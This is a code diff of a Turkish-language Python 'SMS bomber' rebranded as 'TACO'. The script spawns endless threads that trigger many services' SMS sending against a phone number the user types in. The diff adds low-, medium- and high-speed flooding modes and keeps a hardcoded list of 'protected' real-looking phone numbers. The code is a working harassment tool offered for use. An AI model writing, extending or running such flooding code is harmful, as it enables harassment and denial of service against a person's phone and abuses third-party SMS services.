@@ -6,7 +6,7 @@ from os import system
 from sms import SendSms
 import threading
 
-# CODZA ASCII Sanatı Başlangıcı
+# TACO ASCII Sanatı Başlangıcı
 print("""
  TTTTT   AAAAA   CCCC     OOO 
    T     A   A   C       O   O
@@ -15,7 +15,7 @@ print("""
    T     A   A   CCCC     OOO 
 
 """)
-# CODZA ASCII Sanatı 
+# TACO ASCII Sanatı 
 
 servisler_sms = []
 for attribute in dir(SendSms):
@@ -25,7 +25,7 @@ for attribute in dir(SendSms):
             servisler_sms.append(attribute)
 
 # Korunan telefon numaraları (10 haneli, başında 0 veya +90 olmadan)
-korunan_numaralar = ["5015645612", "5059390866", "5052309038", "5053134790", "5549610866", "5419610866", "5362850738", "5070724038", "5421296377"]  # Örnek numaralar, istediğin gibi ekle
+korunan_numaralar = ["5015645611", "5059390866", "5052309038", "5053134790", "5549610866", "5419610866", "5362850738", "5070724038", "5421296377"]  # Örnek numaralar, istediğin gibi ekle
 
 while 1:
     system("cls||clear")
@@ -34,7 +34,7 @@ while 1:
     Sms: {}           {}by {}@Taco\n  
     """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
     try:
-        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Turbo)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
+        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Düşük Hız)\n\n 2- SMS Gönder (Orta Hız)\n\n 3- SMS Gönder (Yüksek Hız)\n\n 4- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
         if menu == "":
             continue
         menu = int(menu) 
@@ -73,25 +73,25 @@ while 1:
                 sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
             except ValueError:
                 system("cls||clear")
-                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası girdiniz. Lütfen tekrar deneyiniz.") 
                 sleep(3)
                 continue
 
         system("cls||clear")
         try:
-            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
+            print(Fore.LIGHTYELLOW_EX + "E-posta adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
             mail = input()
             if ("@" not in mail or ".com" not in mail) and mail != "":
                 raise
         except:
             system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. lütfen tekrar deneyiniz.") 
+            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. Lütfen tekrar deneyiniz.") 
             sleep(3)
             continue
 
         system("cls||clear")
         try:
-            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS (kısa mesaj) göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
+            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS (kısa mesaj) göndermek istiyorsun: {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
             kere = input()
             if kere:
                 kere = int(kere)
@@ -156,12 +156,12 @@ while 1:
                 raise ValueError
         except ValueError:
             system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası girdiniz. Lütfen tekrar deneyiniz.") 
             sleep(3)
             continue
 
         if tel_no in korunan_numaralar:
-            print(Fore.LIGHTRED_EX + f"Bu telefon numarası korunmaktadır: {tel_no}")
+            print(Fore.LIGHTRED_EX + f"Bu telefon numarası özel olarak korunmaktadır: {tel_no}")
             sleep(3)
             continue
 
@@ -173,24 +173,20 @@ while 1:
                 raise
         except:
             system("cls||clear")
-            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi. Tekrar deneyiniz.") 
+            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. Lütfen tekrar deneyiniz.") 
             sleep(3)
             continue
 
         system("cls||clear")
         send_sms = SendSms(tel_no, mail)
         dur = threading.Event()
-        def Turbo():
+        def Normal():
             while not dur.is_set():
-                thread = []
                 for fonk in servisler_sms:
                     t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
-                    thread.append(t)
                     t.start()
-                for t in thread:
-                    t.join()
         try:
-            Turbo()
+            Normal()
         except KeyboardInterrupt:
             dur.set()
             system("cls||clear")
@@ -198,6 +194,53 @@ while 1:
             sleep(2)
 
     elif menu == 3:
+        system("cls||clear")
+        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' veya '0' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
+        tel_no = input()
+        try:
+            int(tel_no)
+            if len(tel_no) != 10:
+                raise ValueError
+        except ValueError:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası girdiniz. Lütfen tekrar deneyiniz.") 
+            sleep(3)
+            continue
+
+        if tel_no in korunan_numaralar:
+            print(Fore.LIGHTRED_EX + f"Bu telefon numarası özel olarak korunmaktadır: {tel_no}")
+            sleep(3)
+            continue
+
+        system("cls||clear")
+        try:
+            print(Fore.LIGHTYELLOW_EX + "E-posta adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
+            mail = input()
+            if ("@" not in mail or ".com" not in mail) and mail != "":
+                raise
+        except:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı e-posta adresi girdiniz. Lütfen tekrar deneyiniz.") 
+            sleep(3)
+            continue
+
+        system("cls||clear")
+        send_sms = SendSms(tel_no, mail)
+        dur = threading.Event()
+        def Hızlı():
+            while not dur.is_set():
+                for fonk in servisler_sms:
+                    t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
+                    t.start()
+        try:
+            Hızlı()
+        except KeyboardInterrupt:
+            dur.set()
+            system("cls||clear")
+            print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
+            sleep(2)
+            
+    elif menu == 4:
         system("cls||clear")
         print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
         break
